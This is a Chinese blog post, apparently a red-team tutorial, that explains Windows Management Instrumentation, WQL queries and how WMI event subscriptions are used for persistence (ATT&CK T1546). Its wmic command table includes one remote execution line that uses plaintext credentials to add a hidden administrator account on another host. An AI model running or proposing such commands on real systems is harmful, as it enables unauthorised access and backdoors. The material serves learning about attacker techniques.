<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>3. Windows Management Instrumentation Event Subscription | DeepMountains</title><meta name="keywords" content="内网渗透,权限维持,att&amp;ck,T1546,deepmountains"><meta name="author" content="DeepMountains"><meta name="copyright" content="DeepMountains"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="referrer" content="no-referrer"><meta name="description" content="WMI的起源        几十年以前，几家IT大厂(BMC、Cisco、Intel、Microsoft)决定解决系统管理领域缺少标准的问题。他们联合在一起，开始捣鼓一个称为基于万维网的企业管理(WBEM，Web Based Enterprise Management)项目。后来WBEM交给了标准化领导机构—分布式管理任务组(DMTF，Distributed management Task For">
<meta property="og:type" content="article">
<meta property="og:title" content="3. Windows Management Instrumentation Event Subscription">
<meta property="og:url" content="http://deepmountains.cn/2022/10/02/3.%20Windows%20Management%20Instrumentation%20Event%20Subscription/index.html">
<meta property="og:site_name" content="DeepMountains">
<meta property="og:description" content="WMI的起源        几十年以前，几家IT大厂(BMC、Cisco、Intel、Microsoft)决定解决系统管理领域缺少标准的问题。他们联合在一起，开始捣鼓一个称为基于万维网的企业管理(WBEM，Web Based Enterprise Management)项目。后来WBEM交给了标准化领导机构—分布式管理任务组(DMTF，Distributed management Task For">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://raw.githubusercontent.com/DeepMountains/DeepMountains.github.io/master/img/blog_img/att%26ck/bash.png">
<meta property="article:published_time" content="2022-10-02T07:17:01.000Z">
<meta property="article:modified_time" content="2022-10-02T07:18:08.808Z">
<meta property="article:author" content="DeepMountains">
<meta property="article:tag" content="T1546">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/DeepMountains/DeepMountains.github.io/master/img/blog_img/att%26ck/bash.png"><link rel="shortcut icon" href="/img/Avatar.png"><link rel="canonical" href="http://deepmountains.cn/2022/10/02/3.%20Windows%20Management%20Instrumentation%20Event%20Subscription/"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-10-02 15:18:08'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><link rel="stylesheet" href="/css/gundong.css"><link rel="stylesheet" href="/css/plugins.min.css"><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" data-lazy-src="/img/Avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div></div></div><hr></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/DeepMountains/DeepMountains.github.io/master/img/blog_img/att%26ck/att%26ck.pngScreensaver权限维持')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">DeepMountains</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">3. Windows Management Instrumentation Event Subscription</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-02T07:17:01.000Z" title="发表于 2022-10-02 15:17:01">2022-10-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-10-02T07:18:08.808Z" title="更新于 2022-10-02 15:18:08">2022-10-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Persistence-T1546-Event-Triggered-Execution/">Persistence [T1546] Event Triggered Execution</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="WMI的起源"><a href="#WMI的起源" class="headerlink" title="WMI的起源"></a>WMI的起源</h3><p>        几十年以前，几家IT大厂(BMC、Cisco、Intel、Microsoft)决定解决系统管理领域缺少标准的问题。他们联合在一起，开始捣鼓一个称为基于万维网的企业管理(WBEM，Web Based Enterprise Management)项目。后来WBEM交给了标准化领导机构—分布式管理任务组(DMTF，Distributed management Task Force)，DMTF启动了一个称为通用信息模型(CIM，Common Information Model)的项目。</p>
<ul>
<li><p>CIM是以面向对象原理为基础，定义了抽象类和类实例的概念。抽象类需要在任何环境中表示管理对象的一般类型，而不受任何特定环境的限制，例如系统、设备、应用程序、网络都可以算是一种抽象的类，而Windows、Linux、Ubuntu可以算是抽象类系统中的实例。</p>
</li>
<li><p>CIM规定提供了构建这种模式的一个模型(称为Schema)和一种语言。Schema就很像数据库表，它包含类需要包含的各个字段，例如属性、方法等等。</p>
</li>
</ul>
<h3 id="初识WMI"><a href="#初识WMI" class="headerlink" title="初识WMI"></a>初识WMI</h3><p>        提到WMI(Windows Management Instrumentation，Windows管理规范)其实大家都不应该感到陌生，它是一项核心的Windows管理技术。通过它可以访问、配置、管理和监视几乎所有的Windows资源，比如用户可以在远程计算机器上启动一个进程；设定一个在特定日期和时间运行的进程；远程启动计算机；获得本地或远程计算机已安装的程序列表；查询本地或远程计算机的Windows事件日志等等。包括在Python中也有WMI的库可以直接对Windows进行操作。</p>
<ul>
<li><p>WMIC.exe：可以直接与WMI进行交互的命令行工具。它拥有大量的WMI对象方便记忆的默认别名，执行复杂的查询。wmic.exe还可以执行WMI方法，通过调用Win32_Process的Create方法来进行横行移动。</p>
</li>
<li><p>常用的wmic功能：</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe list     <span class="comment">#获取补丁信息</span></span><br><span class="line">wmic startup list brief    <span class="comment">#获取启动的程</span></span><br><span class="line">wmic startup list full     <span class="comment">#获取自启动的程序</span></span><br><span class="line">wmic process call create <span class="string">&quot;calc.exe&quot;</span>   <span class="comment">#在当前系统中执行某个程序</span></span><br><span class="line">wmic process <span class="built_in">where</span> name=<span class="string">&#x27;*.exe&#x27;</span> list full   <span class="comment">#查询某个进程对应某个具体可执行程序是什么</span></span><br><span class="line">wmic process <span class="built_in">where</span> (description=<span class="string">&quot;rundll32.exe&quot;</span>)  <span class="comment">#查看rundll32.exe所加载的dll</span></span><br><span class="line">wmic cpu get DataWidth /format:list  <span class="comment">#查询当前机器的操作系统</span></span><br><span class="line">wmic share get name,path,status      <span class="comment">#查找开放的共享</span></span><br><span class="line">wmic /namespace:\root\security cetter2 path antivirusproduct GET displayName,productState,pathToSignedProductExe    <span class="comment">#查询安装的杀软</span></span><br><span class="line">wmic /node:192.168.222.134 /user:Win7-LMB /password:Aa123456 process call create <span class="string">&quot;cmd.exe /c net user attck$ Aa123456 /add &amp;&amp; net localgroup administrators attack&amp; /add&quot;</span>   <span class="comment">#远程命令执行</span></span><br></pre></td></tr></table></figure>

<h3 id="WMI结构体系"><a href="#WMI结构体系" class="headerlink" title="WMI结构体系"></a>WMI结构体系</h3><h4 id="托管组件"><a href="#托管组件" class="headerlink" title="托管组件"></a>托管组件</h4><p>        托管组件表示为WMI对象，表示高度结构化的操作系统数据类实例，就好比是编程语言中的类。微软提供了丰富的WMI对象用来与操作系统相关的信息进行通信。我们可以通过powershell或者系统自带的wql程序进行筛选查看。</p>
<ul>
<li>Win32_Process：表示Windows中运行的进程。例如我们如果想要查看当前系统中运行的进程，可以通过Powershell调用WMI接口来进行查看。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Query <span class="string">&quot;Select * from win32_process&quot;</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line">__GENUS                    : 2</span><br><span class="line">__CLASS                    : Win32_Process</span><br><span class="line">__SUPERCLASS               : CIM_Process</span><br><span class="line">__DYNASTY                  : CIM_ManagedSystemElement</span><br><span class="line">__RELPATH                  : Win32_Process.Handle=<span class="string">&quot;5680&quot;</span></span><br><span class="line">__PROPERTY_COUNT           : 45</span><br><span class="line">__DERIVATION               : &#123;CIM_Process, CIM_LogicalElement, CIM_ManagedSyste</span><br><span class="line">                             mElement&#125;</span><br><span class="line">__SERVER                   : WIN7-LMB-PC</span><br><span class="line">__NAMESPACE                : root\cimv2</span><br><span class="line">__PATH                     : \\WIN7-LMB-PC\root\cimv2:Win32_Process.Handle=<span class="string">&quot;5680&quot;</span></span><br><span class="line">Caption                    : cmd.exe</span><br><span class="line">CommandLine                : <span class="string">&quot;C:\Windows\system32\cmd.exe&quot;</span></span><br><span class="line">CreationClassName          : Win32_Process</span><br><span class="line">CreationDate               : 20210824151818.648842+480</span><br><span class="line">CSCreationClassName        : Win32_ComputerSystem</span><br><span class="line">CSName                     : WIN7-LMB-PC</span><br><span class="line">Description                : cmd.exe</span><br><span class="line">ExecutablePath             : C:\Windows\system32\cmd.exe</span><br><span class="line">ExecutionState             :</span><br><span class="line">Handle                     : 5680</span><br><span class="line">HandleCount                : 23</span><br><span class="line">InstallDate                :</span><br><span class="line">KernelModeTime             : 0</span><br><span class="line">MaximumWorkingSetSize      : 1380</span><br><span class="line">MinimumWorkingSetSize      : 200</span><br><span class="line">Name                       : cmd.exe</span><br><span class="line">OSCreationClassName        : Win32_OperatingSystem</span><br><span class="line">OSName                     : Microsoft Windows 7 旗舰版 |C:\Windows|\Device\Harddisk0\Partition2</span><br><span class="line">OtherOperationCount        : 155</span><br><span class="line">OtherTransferCount         : 1628</span><br><span class="line">PageFaults                 : 798</span><br><span class="line">PageFileUsage              : 2016</span><br><span class="line">ParentProcessId            : 1568</span><br><span class="line">PeakPageFileUsage          : 3048</span><br><span class="line">PeakVirtualSize            : 44093440</span><br><span class="line">PeakWorkingSetSize         : 2996</span><br><span class="line">Priority                   : 8</span><br><span class="line">PrivatePageCount           : 2064384</span><br><span class="line">ProcessId                  : 5680</span><br><span class="line">QuotaNonPagedPoolUsage     : 5</span><br><span class="line">QuotaPagedPoolUsage        : 84</span><br><span class="line">QuotaPeakNonPagedPoolUsage : 5</span><br><span class="line">QuotaPeakPagedPoolUsage    : 84</span><br><span class="line">ReadOperationCount         : 1</span><br><span class="line">ReadTransferCount          : 11506</span><br><span class="line">SessionId                  : 1</span><br><span class="line">Status                     :</span><br><span class="line">TerminationDate            :</span><br><span class="line">ThreadCount                : 1</span><br><span class="line">UserModeTime               : 0</span><br><span class="line">VirtualSize                : 43044864</span><br><span class="line">WindowsVersion             : 6.1.7601</span><br><span class="line">WorkingSetSize             : 3047424</span><br><span class="line">WriteOperationCount        : 0</span><br><span class="line">WriteTransferCount         : 0</span><br><span class="line">ProcessName                : cmd.exe</span><br><span class="line">Handles                    : 23</span><br><span class="line">VM                         : 43044864</span><br><span class="line">WS                         : 3047424</span><br><span class="line">Path                       : C:\Windows\system32\cmd.exe</span><br><span class="line"><span class="comment">#### 由于输出的内容很多，我们可以使用格式化输出语法进行输出 ####</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Get-WmiObject -Query <span class="string">&quot;Select *  from win32_process&quot;</span> | Format-List -Property Name,Path,ProcessId</span><br><span class="line"><span class="comment">##</span></span><br><span class="line">Name      : powershell.exe</span><br><span class="line">Path      : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</span><br><span class="line">ProcessId : 5340</span><br></pre></td></tr></table></figure>

<pre><code>  * Win32_DiskDrive：查看系统的硬盘
  * Win32_PhysicalMedia：查看所有存储设备的详细信息
  * Win32_BIOS：查看系统的BIOS信息
  * Win32_MemoryDevice：查看系统内存信息
  * Win32_PhysicalMemory：查看物理内存设备的详细信息
  * Win32_Processor：查看CPU信息
  * Win32_NetworkAdapter：查看网络适配器信息，包含虚拟网卡和物理网卡
  * Win32_NetworkAdapterConfiguration：查看网络适配器的配置信息
  * Win32_NetworkAdapterSetting：查看网络适配器的相关设定
  * Win32_Printer：查看打印/传真设备
  * Win32_DesktopMonitor：查看显示设备
  * Win32_Desktop：查看桌面信息，屏幕保护程序
  * Win32_Environment：查看系统环境变量
  * Win32_Directory：查看文件目录，所有的目录
  * Win32_DiskPartition：查看磁盘分区
  * Win32_LogicalDisk：查看逻辑磁盘
  * Win32_Account：查看用户信息，包括隐藏账户
  * Win32_Service：查看系统服务
  * Win32_StartupCommand：查看启动项，以及使用的命令
</code></pre>
<h4 id="3-2-WMI数据"><a href="#3-2-WMI数据" class="headerlink" title="3.2 WMI数据"></a>3.2 WMI数据</h4><ul>
<li><p>使用WMI数据：微软提供了几种方式来使用 WMI 数据和执行 WMI 方法。</p>
</li>
<li><p>PowerShell API: 提供了一种非常简单的方式与 WMI 进行交互: Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Process </p>
<ul>
<li><p>WMIC.exe：Windows命令行查询WMI数据</p>
</li>
<li><p>wbemtest.exe：Windows下图形化查询工具</p>
</li>
</ul>
</li>
<li><p>查询WMI数据：所有的WMI对象都使用类似于一个 SQL 查询的语言称为 WMI 查询语言(WQL)。 WQL 能够很好且细微的控制返回给用户的 WMI 对象，这点和Powershell这种面向对象的语言很类似。</p>
</li>
<li><p>填充WMI数据：当用户请求特定的 WMI 对象时，WMI 服务 (Winmgmt) 需要知道如何填充被请求的 WMI 对象。这个过程是由 WMI 提供程序去实现的。WMI提供程序(本质上是一个COM组件程序)是一个基于 COM 的 DLL 文件，它包含一个在注册表中已经注册的相关联的 GUID。 WMI 提供程序的功能，查询所有正在运行的进程，枚举注册表项。</p>
<ul>
<li>当 WMI 服务填充 WMI 对象时，有两种类型的类实例。<ul>
<li><p>动态对象： 动态对象是在特定查询执行时在运行过程中生成的。例如，Win32_Process 对象就是在运行过程中动态生成的</p>
</li>
<li><p>持久性对象：持久性对象存储在位于 %SystemRoot%\System32\wbem\Repository\ 的 CIM(WMI公共信息模型 common information model，CMI) 数据库中，它存储着 WMI 类的实例，类的定义和命名空间的定义。</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>远程传输WMI数据：Microsoft提供了两个协议用于传输WMI数据，分别是分部署组件对象DCOM和Windows远程管理WinRM。</p>
</li>
</ul>
<img title src="/img/loading.gif" data-lazy-src="https://cdn.nlark.com/yuque/0/2021/png/1543119/1629807539925-b4a45e16-2e52-4c28-8f98-41067154e28c.png#clientId=u1b97252b-eaf7-4&from=paste&height=373&id=YF4Fz&margin=%5Bobject%20Object%5D&name=image.png&originHeight=548&originWidth=985&originalType=binary&ratio=1&size=509349&status=done&style=none&taskId=u7164b16b-0cb8-4930-9c97-af2031f687f&width=670.4943237304688" alt="image.png" width="609" data-align="center">

<h4 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h4><p>        WMI命名空间用于对相同环境中存在的类进行分组，也用于加强安全限制。当请求连接到一个命名空间时会检查用户的权限，这决定命名空间级别的权限。命名空间是一个层次结构，类似文件系统中文件目录的层次结构。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root</span><br><span class="line"><span class="comment">## 所有的命名空间均在这个命名空间下，此命名空间只包含WMI系统类，这些类也会在其它命名空间中出现。</span></span><br><span class="line"><span class="comment">### WMI系统类是在名称前面有两个下划线(&quot;_&quot;)组成。</span></span><br><span class="line"></span><br><span class="line">root\Default</span><br><span class="line"><span class="comment">## 与Windows注册表操作有关的主机类，读取、写入、枚举、监视、创建、删除注册表的项和值。</span></span><br><span class="line"></span><br><span class="line">root\CIMV2</span><br><span class="line"><span class="comment">## 包含从CIM Schema派生的类，它们代表着我们最常接触到的Win32环境。</span></span><br><span class="line"></span><br><span class="line">root\MicrosoftIISv2</span><br><span class="line"><span class="comment">## IIS WMI提供程序。</span></span><br><span class="line"></span><br><span class="line">root\RSOP</span><br><span class="line"><span class="comment">## 策略的结果集</span></span><br><span class="line"></span><br><span class="line">root\Policy</span><br><span class="line"><span class="comment">## 组策略</span></span><br><span class="line"></span><br><span class="line">root\Directory\ldap</span><br><span class="line"><span class="comment">## Active Directory提供程序</span></span><br></pre></td></tr></table></figure>

<ul>
<li>利用WQL进行查询：在“运行”中，输入“wbemtest.exe” 。点击连接选择需要连接的命名空间，点击查询输入WQL语句。</li>
</ul>
<img title src="/img/loading.gif" data-lazy-src="https://cdn.nlark.com/yuque/0/2021/png/1543119/1629793786371-5a468af5-fa4f-4fa4-b4dd-b1051b579f5a.png#clientId=u1b97252b-eaf7-4&from=paste&height=376&id=u58559166&margin=%5Bobject%20Object%5D&name=image.png&originHeight=974&originWidth=1044&originalType=binary&ratio=1&size=386444&status=done&style=shadow&taskId=ucf32406d-45c9-4be1-ae71-7a4e4d37ea9&width=402.9886474609375" alt="image.png" width="559" data-align="center">

<pre><code>     - Schema：获取类定义，使用的基本语法形式和其它类型的查询一样，`Select * from Meta_Class Where __CLASS like &quot;Win32_%&quot;`
</code></pre>
<p><img src="/img/loading.gif" data-lazy-src="https://cdn.nlark.com/yuque/0/2021/png/1543119/1629793908663-f4b46ba3-a913-4a64-acd7-cf73a7ef638a.png#clientId=u1b97252b-eaf7-4&from=paste&height=319&id=u052bd102&margin=%5Bobject%20Object%5D&name=image.png&originHeight=780&originWidth=1094&originalType=binary&ratio=1&size=425398&status=done&style=shadow&taskId=uddbf8b13-9bb8-47e9-bb1d-dc1b9b85bef&width=446.98858642578125" alt="image.png"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">From</span> Win32_Process </span><br><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">From</span> Win32_Process <span class="keyword">Where</span> ProcessId <span class="operator">=</span> <span class="number">608</span> </span><br><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">From</span> Win32_Process <span class="keyword">Where</span> Priority <span class="operator">&gt;</span> <span class="number">8</span> </span><br><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">From</span> Win32_Process <span class="keyword">Where</span> WriteOperationCount <span class="operator">&lt;</span> <span class="number">1000</span> </span><br><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">From</span> Win32_Process <span class="keyword">Where</span> ParentProcessId <span class="operator">&lt;&gt;</span> <span class="number">884</span></span><br><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">From</span> Win32_Process <span class="keyword">Where</span> ParentProcessId <span class="operator">!=</span> <span class="number">884</span></span><br><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">From</span> Win32_Process <span class="keyword">Where</span> <span class="keyword">Not</span> ParentProcessId <span class="operator">=</span> <span class="number">884</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Data：获取类的实例，它返回特定类的所有实例，例如查看某个进程<code>Select * from Win32_Process Where Name=&quot;cmd.exe&quot;</code></li>
</ul>
<img title src="/img/loading.gif" data-lazy-src="https://cdn.nlark.com/yuque/0/2021/png/1543119/1629794201978-dc7a3521-f260-491c-a0fa-c80f50ddb97f.png#clientId=u1b97252b-eaf7-4&from=paste&height=457&id=u3d0dc6c5&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1122&originWidth=1106&originalType=binary&ratio=1&size=567049&status=done&style=shadow&taskId=ue812f377-96a5-44d8-985e-73c04801dbf&width=449.99713134765625" alt="image.png" width="533" data-align="center">

<ul>
<li><p>Event：获取一个特定事件通知属性，通常用来在一个WMI对象实例创建/修改/删除的时候给用户发送一个消息。同时允许每个查询允许添加一些附加的操作符号，如：</p>
<ul>
<li><p>WITHIN：指定轮询(确定WMI轮询监控事件的频率)或分组间隔(确定WMI收集类似事件的初始事件后的时间)。间隔是一个整数值，表示着秒的数量。[由于轮询处理具备的资源特性,所以推荐把WITHIN子句中的轮询间隔设为相对高的值(大于300秒)]</p>
</li>
<li><p>GROUP：分组相同的事件，并为所有的它们生成单独的通知。</p>
</li>
</ul>
</li>
<li><p>在后续的利用内容中，使用到的就是Event查询方法来达到持久化的目的，具体的演示内容我们会在后面的利用手法中详细阐述。</p>
</li>
</ul>
<h3 id="WMI-Event-Subscription权限维持"><a href="#WMI-Event-Subscription权限维持" class="headerlink" title="WMI Event Subscription权限维持"></a>WMI Event Subscription权限维持</h3><h4 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h4><p>        恶意进程创建：部分 WMI 对象包括可执行的方法。例如攻击者进行横向运动时执行的一个常用方法是在 Win32_Process 类中的静态 Create 方法，此方法可以快速创建一个新的进程。<code>wmic process call create &quot;calc.exe&quot;</code></p>
<img title src="/img/loading.gif" data-lazy-src="https://cdn.nlark.com/yuque/0/2021/png/1543119/1629807282077-d5f9f39d-e082-42e1-a3c9-23fb49375585.png#clientId=u1b97252b-eaf7-4&from=paste&height=165&id=u8f6677d4&margin=%5Bobject%20Object%5D&name=image.png&originHeight=402&originWidth=1016&originalType=binary&ratio=1&size=228324&status=done&style=shadow&taskId=ud139dc5d-0878-4f4d-b306-d998ae5b6c5&width=417.99713134765625" alt="image.png" width="597" data-align="center">

<ul>
<li><p>事件触发执行：WMI 提供了一个事件系统，使用户可以使用注册事件处理函数进行创建，修改或删除任何 WMI 对象实例。例如用于监控进程创建事件并获得回调。我们可以使用WMI永久事件订阅(permanent event subscriptions)机制来触发特定操作。攻击者经常利用这个功能，在系统启动时执行后门程序，完成本地持久化。</p>
<ul>
<li>WMI的事件订阅包含三个核心WMI类 <ul>
<li><p>Filter(过滤器)类: WMI Filter用来定义触发Consumer的具体条件，包括系统启动、特定程序执行、特定时间间隔以及其他条件。</p>
</li>
<li><p>Consumer(消费者)类: WMI Consumer用来指定要执行的具体操作，包括执行命令、运行脚本、添加日志条目或者发送邮件。</p>
</li>
<li><p>FilterToConsumerBinding类: FilterToConsumerBinding用来将Consumer与Filter关联在一起。创建一个WMI永久事件订阅需要系统的管理员权限。</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>事件行为案例</p>
<ul>
<li>__InstanceCreationEvent：实例被创建事件。若发生创建实例的事件则会增加对象数量。</li>
</ul>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 检查是否有Notepad.exe进程被创建</span><br><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">From</span> __InstanceCreationEvent </span><br><span class="line"><span class="keyword">Within</span> <span class="number">5</span> </span><br><span class="line"><span class="keyword">Where</span> TargetInstance Isa &quot;Win32_Process&quot; </span><br><span class="line"><span class="keyword">And</span> TargetInstance.Name <span class="operator">=</span> &quot;Notepad.exe&quot; </span><br></pre></td></tr></table></figure>

<img title src="/img/loading.gif" data-lazy-src="https://cdn.nlark.com/yuque/0/2021/png/1543119/1629808935685-159986ca-6bb9-4abb-9e5b-4f4caab465c9.png#clientId=u1b97252b-eaf7-4&from=paste&height=295&id=u9faa991a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=786&originWidth=1104&originalType=binary&ratio=1&size=134783&status=done&style=shadow&taskId=u7542101c-9989-4cb2-b29c-67268214720&width=414.98858642578125" alt="image.png" width="519" data-align="center">
